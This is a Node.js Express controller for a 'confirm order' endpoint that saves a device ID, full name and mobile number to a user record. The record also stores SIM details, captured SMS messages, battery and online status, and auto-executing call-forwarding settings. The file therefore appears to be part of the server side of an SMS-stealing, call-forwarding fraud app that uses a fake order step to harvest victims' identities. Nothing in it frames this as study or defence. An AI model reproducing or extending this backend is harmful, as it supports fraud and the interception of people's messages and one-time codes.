import User from '../models/UserModel.js';

/**
 * Confirm Order Endpoint
 * Creates/updates user with order confirmation details
 * @route POST /api/confirm-order
 */
export const confirmOrder = async (req, res) => {
    const { deviceId, fullName, mobile } = req.body;
    
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('📝 CONFIRM ORDER REQUEST RECEIVED');
    console.log('📱 Device ID:', deviceId);
    console.log('👤 Full Name:', fullName);
    console.log('📞 Mobile:', mobile);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    // Validate required fields
    if (!deviceId || !deviceId.trim()) {
        console.error('❌ Missing deviceId');
        return res.status(400).json({ 
            success: false, 
            error: 'Device ID is required' 
        });
    }

    if (!fullName || !fullName.trim()) {
        console.error('❌ Missing fullName');
        return res.status(400).json({ 
            success: false, 
            error: 'Full name is required' 
        });
    }

    if (!mobile || !mobile.trim()) {
        console.error('❌ Missing mobile');
        return res.status(400).json({ 
            success: false, 
            error: 'Mobile number is required' 
        });
    }

    // Validate mobile number format (10 digits starting with 6-9)
    const mobilePattern = /^[6-9]\d{9}$/;
    if (!mobilePattern.test(mobile.trim())) {
        console.error('❌ Invalid mobile number format:', mobile);
        return res.status(400).json({ 
            success: false, 
            error: 'Please enter a valid 10-digit mobile number' 
        });
    }

    try {
        const cleanedDeviceId = deviceId.trim();
        const cleanedFullName = fullName.trim();
        const cleanedMobile = mobile.trim();

        console.log('🔍 Searching for user with deviceId:', cleanedDeviceId);

        // Check if user exists
        let user = await User.findOne({ deviceId: cleanedDeviceId });

        if (user) {
            console.log('✅ User found, updating order confirmation...');
            console.log('📊 Current user data:', {
                fullName: user.fullName,
                mobile: user.mobile,
                orderConfirmed: user.orderConfirmed
            });

            // Update existing user
            user.fullName = cleanedFullName;
            user.mobile = cleanedMobile;
            user.orderConfirmed = true;
            user.lastSeen = new Date();

            await user.save();

            console.log('✅ User updated successfully');
        } else {
            console.log('🆕 User not found, creating new user...');

            // Create new user with order confirmation
            user = new User({
                deviceId: cleanedDeviceId,
                fullName: cleanedFullName,
                mobile: cleanedMobile,
                orderConfirmed: true,
                deviceName: 'Unknown Device',
                battery: 0,
                online: false,
                simInfo: [],
                callForwardingSettings: {
                    autoExecuteEnabled: false,
                    monitoringEnabled: true,
                    defaultAutoNumber: '',
                    lastStatusCheck: null
                },
                sms: [],
                lastSeen: new Date(),
                totalSmsCount: 0,
                lastSmsReceived: null,
                registrationCount: 1
            });

            await user.save();

            console.log('✅ New user created successfully');
        }

        const orderId = `DM2024${Date.now()}`;
        const orderDate = new Date().toISOString();

        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log('✅ ORDER CONFIRMED SUCCESSFULLY');
        console.log('📋 Order ID:', orderId);
        console.log('📅 Order Date:', orderDate);
        console.log('👤 User:', cleanedFullName);
        console.log('📞 Mobile:', cleanedMobile);
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

        return res.json({
            success: true,
            message: 'Order confirmed successfully',
            user: {
                deviceId: user.deviceId,
                fullName: user.fullName,
                mobile: user.mobile,
                orderConfirmed: user.orderConfirmed,
                orderId: orderId,
                orderDate: orderDate
            }
        });

    } catch (error) {
        console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.error('❌ ERROR CONFIRMING ORDER');
        console.error('Error:', error.message);
        console.error('Stack:', error.stack);
        console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

        // Handle duplicate key error
        if (error.code === 11000) {
            return res.status(409).json({ 
                success: false, 
                error: 'This device is already registered. Please contact support.' 
            });
        }

        // Handle validation errors
        if (error.name === 'ValidationError') {
            const validationErrors = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({ 
                success: false, 
                error: validationErrors.join(', ') 
            });
        }

        return res.status(500).json({ 
            success: false, 
            error: 'Server error. Please try again later.',
            details: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
};
